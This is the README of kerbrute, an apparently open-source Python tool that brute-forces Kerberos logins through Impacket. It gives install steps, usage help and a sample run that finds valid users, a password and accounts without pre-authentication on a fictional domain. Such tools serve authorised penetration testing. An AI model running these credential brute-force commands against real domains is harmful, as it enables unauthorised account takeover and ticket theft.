# kerbrute
An script to perform kerberos bruteforcing by using the Impacket library.

When is executed, as input it receives a user or list of users and a password or list of password. Then is performs a brute-force attack to enumerate:
* Valid username/passwords pairs
* Valid usernames
* Usernames without pre-authentication required

As a result, the script generates a list of valid credentials discovered, and the TGT's generated due those valid credentials.

## Installation

To install:
```
lsgit clone https://github.com/TarlogicSecurity/kerbrute
cd kerbrute
pip install -r requirements.txt
```

## Use

Help without arguments:
```shell
root@kali:kerbrute# python kerbrute.py
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

usage: kerbrute.py [-h] [-debug] (-user USER | -users USERS)
                   [-password PASSWORD | -passwords PASSWORDS] -domain DOMAIN
                   [-dc-ip <ip_address>] [-threads THREADS]
                   [-outputfile OUTPUTFILE] [-no-save-ticket]

optional arguments:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -user USER            User to perform bruteforcing
  -users USERS          File with user per line
  -password PASSWORD    Password to perform bruteforcing
  -passwords PASSWORDS  File with password per line
  -domain DOMAIN        Domain to perform bruteforcing
  -dc-ip <ip_address>   IP Address of the domain controller
  -threads THREADS      Number of threads to perform bruteforcing. Default = 1
  -outputfile OUTPUTFILE
                        File to save discovered user:password
  -no-save-ticket       Do not save retrieved TGTs with correct credentials

Examples: 
	./kerbrute.py -users users_file.txt -passwords passwords_file.txt -domain contoso.com
```

Example of execution:
```shell
root@kali:kerbrute# python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Stupendous => triceratops:Sh4rpH0rns
[*] Saved TGT in triceratops.ccache
[*] Valid user => velociraptor [NOT PREAUTH]
[*] Valid user => trex
[*] Saved discovered passwords in jurassic_passwords.txt
```
